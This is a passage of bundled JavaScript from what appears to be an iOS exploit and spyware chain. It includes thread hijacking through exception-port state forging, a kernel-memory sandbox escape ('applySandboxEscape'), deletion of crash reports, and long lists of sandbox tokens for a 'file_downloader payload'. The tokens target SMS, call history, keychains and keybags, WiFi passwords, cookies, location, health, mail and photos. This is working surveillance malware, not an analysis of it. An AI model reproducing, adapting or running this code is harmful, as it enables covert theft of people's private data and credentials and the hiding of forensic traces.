  var x7 = arguments.length > 9 && arguments[9] !== undefined ? arguments[9] : 0n;
  if (!_classPrivateFieldGet(_creatingExtraThread, this)) return _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallTemp).call(this, timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);

  //Calculate actual pc addr
  var pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
  if (!pcAddr) {
    console.log(TAG, "Unable to find symbol: " + name);
    return 0;
  }
  var newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000, timeout);
  // First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
  var excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_secondExceptionPort, this), excBuffer, newTimeout, false)) {
    console.log(TAG, "Don't receive first exception on new thread");
    return 0;
  }
  var excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
  var exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
  // Set the new state
  var newState = exc.threadState;
  newState.registers.set(0, x0);
  newState.registers.set(1, x1);
  newState.registers.set(2, x2);
  newState.registers.set(3, x3);
  newState.registers.set(4, x4);
  newState.registers.set(5, x5);
  newState.registers.set(6, x6);
  newState.registers.set(7, x7);
  newState = _assertClassBrand(_RemoteCall_brand, this, _signState).call(this, _classPrivateFieldGet(_trojanThreadAddr, this), newState, pcAddr, fakeLRTrojan);
  _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
  exc.threadState.registers.set(0, x0);

  // Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
  if (timeout < 0) {
    console.log(TAG, "Trojan thread cleanup");
    return 0;
  }
  // Wait for the exception on LR corruption, so we can get return value of the call.
  if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_secondExceptionPort, this), excBuffer, newTimeout, false)) {
    console.log(TAG, "Don't receive second exception on new thread");
    return 0;
  }
  excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
  exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
  var retValue = exc.threadState.registers.get(0);

  // Corrupt again PC so we can control flow for the next call.
  newState = exc.threadState;
  // Can be therotical used one previous implementation doesn't set LR
  //signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
  _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
  return retValue;
}
function _restoreTrojanThread(state) {
  var excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
  if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_firstExceptionPort, this), excBuffer, 20000, false)) {
    console.log(TAG, "Failed to receive first exception while restoring");
    return false;
  }
  var excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
  var exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
  state.opaque_flags = exc.threadState.opaque_flags;
  state = _assertClassBrand(_RemoteCall_brand, this, _signState).call(this, _classPrivateFieldGet(_trojanThreadAddr, this), state, state.opaque_pc, state.opaque_lr);
  _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, state, false);
  return true;
}
function _putShmemInCache(shmem) {
  for (var i = 0; i < SHMEM_CACHE_SIZE; i++) {
    if (!_classPrivateFieldGet(_shmemCache, this)[i]) {
      // TODO encapsulate this inside shmem struct
      var shmemBuff = new ArrayBuffer(0x18);
      _classPrivateFieldGet(_shmemCache, this)[i] = new _VMShmem__WEBPACK_IMPORTED_MODULE_10__["default"](shmemBuff);
      _classPrivateFieldGet(_shmemCache, this)[i].port = shmem.port;
      _classPrivateFieldGet(_shmemCache, this)[i].localAddress = shmem.localAddress;
      _classPrivateFieldGet(_shmemCache, this)[i].remoteAddress = shmem.remoteAddress;
      return _classPrivateFieldGet(_shmemCache, this)[i];
    }
  }
  return null;
}
function _getShmemForPage(pageAddr) {
  var remotePage = _assertClassBrand(_RemoteCall_brand, this, _getShmemFromCache).call(this, pageAddr);
  if (!remotePage) {
    //console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
    var newRemotePage = _VM__WEBPACK_IMPORTED_MODULE_9__["default"].mapRemotePage(_classPrivateFieldGet(_vmMap, this), pageAddr);
    if (!newRemotePage || !newRemotePage.localAddress) return false;
    return _assertClassBrand(_RemoteCall_brand, this, _putShmemInCache).call(this, newRemotePage);
  }
  //console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
  return remotePage;
}
function _getShmemFromCache(pageAddr) {
  //console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
  for (var i = 0; i < SHMEM_CACHE_SIZE; i++) {
    if (_classPrivateFieldGet(_shmemCache, this)[i]) if (_classPrivateFieldGet(_shmemCache, this)[i].remoteAddress === pageAddr) return _classPrivateFieldGet(_shmemCache, this)[i];
  }
  return null;
}
function _writeCFStr(dst, str) {
  var kCFStringEncodingUTF8 = 0x08000100n;
  libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(dst, str);
  return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("CFStringCreateWithCString", 0n, dst, kCFStringEncodingUTF8);
}
function _EXC_GUARD_ENCODE_TYPE(code, type) {
  code |= (type & BigInt('0x7')) << 61n;
  return code;
}
function _EXC_GUARD_ENCODE_FLAVOR(code, flavor) {
  code |= (flavor & BigInt('0x1fffffff')) << 32n;
  return code;
}
function _EXC_GUARD_ENCODE_TARGET(code, target) {
  code |= target & BigInt('0xffffffff');
  return code;
}


/***/ }),

/***/ "./libs/TaskRop/Sandbox.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Sandbox; });
/* harmony import */ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/JSUtils/FileUtils.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/TaskRop/Task.js");
/* harmony import */ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__("./libs/Chain/Native.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
var _ref;
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }






var TAG = "SANDBOX";
var Sandbox = /*#__PURE__*/function () {
  function Sandbox() {
    _classCallCheck(this, Sandbox);
  }
  return _createClass(Sandbox, null, [{
    key: "initWithLaunchdTask",
    value: function initWithLaunchdTask(launchdTask) {
      _launchdTask._ = _assertClassBrand(Sandbox, this, launchdTask);
    }
  }, {
    key: "getTokenForPath",
    value: function getTokenForPath(path) {
      var consume = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
      if (!_assertClassBrand(Sandbox, this, _launchdTask)._ || !_assertClassBrand(Sandbox, this, _launchdTask)._.success()) return;

      //console.log(TAG,`Creating token for path:${path}`);
      var memRemote = _assertClassBrand(Sandbox, this, _launchdTask)._.mem();
      var pathRemote = memRemote;
      _assertClassBrand(Sandbox, this, _launchdTask)._.writeStr(pathRemote, path);
      var appSandboxReadExt = "com.apple.app-sandbox.read-write";
      var sandboxExtensionEntry = memRemote + 0x100n;
      _assertClassBrand(Sandbox, this, _launchdTask)._.writeStr(sandboxExtensionEntry, appSandboxReadExt);
      var tokenRemote = _assertClassBrand(Sandbox, this, _launchdTask)._.call(100, "sandbox_extension_issue_file", sandboxExtensionEntry, pathRemote, 0n, 0n);
      if (!tokenRemote) {
        console.log(TAG, "Unable to create token for: " + path);
        return null;
      }
      //console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
      var token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
      _assertClassBrand(Sandbox, this, _launchdTask)._.read(tokenRemote, token, 512n);
      if (consume) libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume", token);
      token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token, 512);
      //console.log(TAG,`token:${token}`);
      if (!token || !token.includes("com.apple.app-sandbox.read-write")) {
        console.log(TAG, "Found weird token:".concat(token, ", not registering"));
        return null;
      }
      return token;
    }
  }, {
    key: "createTokens",
    value: function createTokens() {
      console.log(TAG, "Create tokens...");
      var keys = Object.keys(_assertClassBrand(Sandbox, this, _PathDictionary)._);
      for (var _i = 0, _keys = keys; _i < _keys.length; _i++) {
        var key = _keys[_i];
        _assertClassBrand(Sandbox, this, _PathDictionary)._[key] = this.getTokenForPath(key, false);
      }

      // Those are required for Bailer
      //if (!this.#weAreLaunchd) {
      this.getTokenForPath("/bin/", true);
      this.getTokenForPath("/Applications/", true);
      this.getTokenForPath("/private/var/tmp/", true);
      this.getTokenForPath("/tmp/", true);
      this.getTokenForPath("/private/var/mobile/Media/", true);
      this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
      this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
      this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
      this.getTokenForPath("/private/var/containers/Bundle/Application/", true);
      this.getTokenForPath("/var/containers/Bundle/Application/", true);
      this.getTokenForPath("/private/var/containers/Shared/SystemGroup/", true);
      this.getTokenForPath("/private/var/preferences/SystemConfiguration/preferences.plist", true);
      this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
      this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
      this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
      //}

      // Forensic file paths for file_downloader payload
      console.log(TAG, "Create tokens for forensic paths...");
      this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
      this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
      this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
      this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);

      // Keychain tokens (with /private prefix)
      this.getTokenForPath("/private/var/Keychains/", true);
      this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
      this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
      this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
      this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);

      // Keychain tokens (without /private prefix - alternate)
      this.getTokenForPath("/var/Keychains/", true);
      this.getTokenForPath("/var/Keychains/keychain-2.db", true);
      this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
      this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
      this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);

      // Keybag tokens (legacy location)
      this.getTokenForPath("/private/var/keybags/", true);
      this.getTokenForPath("/private/var/keybags/systembag.kb", true);
      this.getTokenForPath("/private/var/keybags/persona.kb", true);
      this.getTokenForPath("/private/var/keybags/usersession.kb", true);
      this.getTokenForPath("/private/var/keybags/backup/", true);

      // Keybag tokens (without /private - alternate)
      this.getTokenForPath("/var/keybags/", true);
      this.getTokenForPath("/var/keybags/systembag.kb", true);
      this.getTokenForPath("/var/keybags/persona.kb", true);
      this.getTokenForPath("/var/keybags/usersession.kb", true);
      this.getTokenForPath("/var/keybags/backup/", true);
      this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);

      // Keybag tokens (Keychains directory - iOS 18)
      this.getTokenForPath("/private/var/Keychains/System.keybag", true);
      this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
      this.getTokenForPath("/private/var/Keychains/persona.kb", true);
      this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
      this.getTokenForPath("/private/var/Keychains/device.kb", true);
      this.getTokenForPath("/var/Keychains/persona.kb", true);
      this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
      this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
      this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);

      // WiFi password file locations (for pickup from wifid)
      this.getTokenForPath("/var/wireless/", true);
      this.getTokenForPath("/private/var/wireless/", true);
      this.getTokenForPath("/private/var/wireless/Library/", true);
      this.getTokenForPath("/private/var/wireless/Library/Preferences/", true);
      this.getTokenForPath("/private/var/wireless/Library/Databases/", true);
      this.getTokenForPath("/private/var/wireless/Library/ControlCenter/", true);
      this.getTokenForPath("/private/var/mobile/Library/CoreDuet/", true);
      this.getTokenForPath("/private/var/mobile/Library/PersonalizationPortrait/", true);
      this.getTokenForPath("/var/log/", true);
      this.getTokenForPath("/private/var/log/", true);
      this.getTokenForPath("/var/db/", true);
      this.getTokenForPath("/private/var/db/", true);
      this.getTokenForPath("/var/run/", true);
      this.getTokenForPath("/private/var/run/", true);
      this.getTokenForPath("/private/var/networkd/", true);
      this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
      this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
      this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
      this.getTokenForPath("/private/var/root/Library/Caches/locationd/", true);
      this.getTokenForPath("/private/var/mobile/Library/Notes/", true);
      this.getTokenForPath("/private/var/mobile/Library/Calendar/", true);
      this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
      this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
      this.getTokenForPath("/var/mobile/Media/", true);

      // iCloud Drive tokens
      this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
      this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
      this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
      this.getTokenForPath("/var/mobile/Media/DCIM/", true);
      this.getTokenForPath("/private/var/mobile/Library/Health/", true);
      this.getTokenForPath("/private/var/root/Library/Lockdown/", true);
      this.getTokenForPath("/private/var/mobile/Library/Preferences/", true);
      this.getTokenForPath("/private/var/mobile/Library/Accounts/", true);
      this.getTokenForPath("/private/var/mobile/Library/Mail/", true);
      this.getTokenForPath("/private/var/mobile/Library/FrontBoard/", true);
    }
  }, {
    key: "applyTokensForRemoteTask",
    value: function applyTokensForRemoteTask(remoteTask) {
      var remoteMem = remoteTask.mem();
      var keys = Object.keys(_assertClassBrand(Sandbox, this, _PathDictionary)._);
      for (var _i2 = 0, _keys2 = keys; _i2 < _keys2.length; _i2++) {
        var key = _keys2[_i2];
        if (_assertClassBrand(Sandbox, this, _PathDictionary)._[key]) {
          //console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
          remoteTask.writeStr(remoteMem, _assertClassBrand(Sandbox, this, _PathDictionary)._[key]);
          remoteTask.call(100, "sandbox_extension_consume", remoteMem);
          //console.log(TAG,`Result of consume:${resConsume}`);
        }
      }
    }
  }, {
    key: "destroy",
    value: function destroy() {
      if (_assertClassBrand(Sandbox, this, _launchdTask)._) _assertClassBrand(Sandbox, this, _launchdTask)._.destroy();
    }
  }, {
    key: "deleteCrashReports",
    value: function deleteCrashReports() {
      this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/", true);
      libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/", true);
    }
  }, {
    key: "adjustMemoryPressure",
    value: function adjustMemoryPressure(processName) {
      var MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK = 5;
      var MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT = 6;
      var MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED = 16;
      var pid = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].pidof(processName);
      if (!pid) {
        console.log(TAG, "Unable to get pid of: " + processName);
        return;
      }
      if (!_assertClassBrand(Sandbox, this, _launchdTask)._ || !_assertClassBrand(Sandbox, this, _launchdTask)._.success()) return;
      var memResult = _assertClassBrand(Sandbox, this, _launchdTask)._.call(100, "memorystatus_control", MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK, pid, -1, 0, 0);
      console.log(TAG, "waterMark result: ".concat(memResult));
      memResult = _assertClassBrand(Sandbox, this, _launchdTask)._.call(100, "memorystatus_control", MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED, pid, 0, 0, 0);
      console.log(TAG, "isManaged result: ".concat(memResult));
      memResult = _assertClassBrand(Sandbox, this, _launchdTask)._.call(100, "memorystatus_control", MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, pid, 0, 0, 0);
      console.log(TAG, "taskLimit result: ".concat(memResult));
    }
  }, {
    key: "applySandboxEscape",
    value: function applySandboxEscape() {
      var _CS_DARWIN_USER_TEMP_DIR = 65537n;
      var write_file_path = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("calloc", 1n, 1024n);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("confstr", _CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
      var randomHex = "/" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("arc4random"));
      var randomHexPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].writeString(randomHexPtr, randomHex);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strcat", write_file_path, randomHexPtr);

      // mktmp should work
      // confstrr path
      // also in pe
      //let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
      var appSandboxReadExt = "com.apple.app-sandbox.read-write";
      var extension = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_issue_file", appSandboxReadExt, write_file_path, 0n, 0n);
      if (!extension) {
        console.log(TAG, "Sandbox failure 1");
        return false;
      }
      var resConsume = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume", extension);
      if (resConsume == -1) {
        console.log(TAG, "Sandbox failure 2");
        return false;
      }
      var ourTaskAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskAddrByPID(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("getpid"));
      console.log(TAG, "ourTaskAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourTaskAddr)));
      var ourProcAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskProc(ourTaskAddr);
      console.log(TAG, "ourProcAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourProcAddr)));
      var credRefAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ourProcAddr + 0x18n);
      if (credRefAddr == 0n) {
        console.log(TAG, "Sandbox failure 3");
        return false;
      }
      credRefAddr = credRefAddr + 0x28n;
      var credAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credRefAddr);
      if (credAddr == 0n) {
        console.log(TAG, "Sandbox failure 4");
        return false;
      }
      console.log(TAG, "credRefAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(credRefAddr)));
      var labelAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credAddr + 0x78n);
      if (labelAddr == 0n) {
        console.log(TAG, "Sandbox failure 5");
        return false;
      }
      console.log(TAG, "labelAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(labelAddr)));
      var sandboxAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(labelAddr + 0x8n + 1n * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
      if (sandboxAddr == 0n) {
        console.log(TAG, "Sandbox failure 6");
        return false;
      }
      console.log(TAG, "sandboxAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(sandboxAddr)));
      var ext_setAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(sandboxAddr + 0x10n);
      if (ext_setAddr == 0n) {
        console.log(TAG, "Sandbox failure 7");
        return false;
      }
      console.log(TAG, "ext_setAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ext_setAddr)));
      var ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
      var hash = 0n;
      console.log(TAG, "hash:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(hash)));
      //hash = 4n; // for read
      hash = 0n; // for read-write
      var ext_hdrAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_tableAddr + hash * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
      if (ext_hdrAddr == 0n) {
        console.log(TAG, "Sandbox failure 8");
        return false;
      }
      /*
      newHash = hashing_magic(appSandboxReadWriteExt);
      LOG("ext_hdrAddr:%llx",ext_hdrAddr);
      sleep(1);
      mach_vm_address_t nullAddr = 0;
      chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
      chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
      */
      for (;;) {
        var nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
        if (nextAddr == 0n) break;
        ext_hdrAddr = nextAddr;
      }
      var ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
      var extAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_lstAddr);
      if (extAddr == 0n) {
        console.log(TAG, "Sandbox failure 9");
        return false;
      }
      console.log(TAG, "extAddr:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(extAddr)));
      var dataLength = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x48n);
      var dataAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x40n);
      if (dataLength == 0n || dataAddr == 0n) {
        console.log(TAG, "Sandbox failure 10");
        return false;
      }
      var pathLength = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strlen", write_file_path) + 1;
      console.log(TAG, "dataLength:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(dataLength), " pathLength:").concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(pathLength)));
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write8(dataAddr, 0);
      libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write64(extAddr + 0x48n, 0n);
      console.log(TAG, "Finished succesfully");
      return true;
    }
  }]);
}();
var _launchdTask = {
  _: null
};
var _PathDictionary = {
  _: (_ref = {
    // Communications
    "/private/var/mobile/Library/AddressBook/": 0,
    "/private/var/mobile/Library/CallHistoryDB/": 0,
    "/private/var/mobile/Library/DoNotDisturb/": 0,
    "/private/var/mobile/Library/SMS/": 0,
    "/private/var/mobile/Library/Calendar/": 0,
    "/private/var/mobile/Library/Mail/": 0,
    "/private/var/mobile/Library/Voicemail/": 0,
    "/var/mobile/Library/Recordings": 0,
    // Location
    "/private/var/root/Library/Caches/locationd": 0,
    "/private/var/root/Library/Caches/locationd/": 0,
    "/private/var/mobile/Library/Caches/locationd/": 0,
    "/private/var/mobile/Library/Caches/com.apple.routined/": 0,
    // Browser & Cookies
    "/private/var/mobile/Library/Safari/": 0,
    "/private/var/mobile/Library/Cookies/": 0,
    "/private/var/mobile/Cookies/": 0,
    // Credentials & WiFi
    "/private/var/Keychains/": 0,
    "/var/Keychains/": 0,
    "/private/var/keybags/": 0,
    "/var/keybags/": 0,
    "/private/var/keybags/systembag.kb": 0,
    "/private/var/keybags/persona.kb": 0,
    "/private/var/keybags/usersession.kb": 0,
    "/private/var/keybags/backup/": 0
  }, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, "/var/keybags/", 0), "/var/keybags/systembag.kb", 0), "/var/keybags/persona.kb", 0), "/var/keybags/usersession.kb", 0), "/var/keybags/backup/", 0), "/var/keybags/backup/backup_keys_cache.sqlite", 0), "/private/var/preferences/com.apple.wifi.known-networks.plist", 0), "/private/var/preferences/SystemConfiguration/", 0), "/private/var/preferences/SystemConfiguration/preferences.plist", 0), "/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", 0), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, "/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", 0), "/private/var/networkd/db/", 0), "/var/wireless/", 0), "/private/var/wireless/", 0), "/var/wireless/Library/", 0), "/var/wireless/Library/Caches/", 0), "/var/wireless/Library/Preferences/", 0), "/var/wireless/Library/Databases/", 0), "/var/wireless/Library/ControlCenter/", 0), "/private/var/wireless/Library/", 0), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, "/private/var/wireless/Library/Preferences/", 0), "/private/var/wireless/Library/Databases/", 0), "/private/var/wireless/Library/ControlCenter/", 0), "/private/var/mobile/Library/CoreDuet/", 0), "/private/var/mobile/Library/CoreDuet/People/", 0), "/private/var/mobile/Library/PersonalizationPortrait/", 0), "/var/log/", 0), "/private/var/log/", 0), "/var/db/", 0), "/private/var/db/", 0), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, "/var/run/", 0), "/private/var/run/", 0), "/private/var/mobile/Library/Notes/", 0), "/private/var/mobile/Library/Health/", 0), "/private/var/mobile/Media/", 0), "/private/var/mobile/Media/PhotoData/", 0), "/private/var/mobile/Media/DCIM/", 0), "/var/mobile/Media/", 0), "/var/mobile/Media/PhotoData/", 0), "/var/mobile/Media/DCIM/", 0), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, "/private/var/root/Library/Lockdown/", 0), "/private/var/mobile/Library/Preferences/", 0), "/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist", 0), "/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist", 0), "/private/var/mobile/Library/Accounts/", 0), "/private/var/protected/trustd/private/", 0), "/private/var/protected/trustd/private", 0), "/bin/", 0), "/Applications/", 0), "/private/var/containers/Bundle/Application/", 0), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_ref, 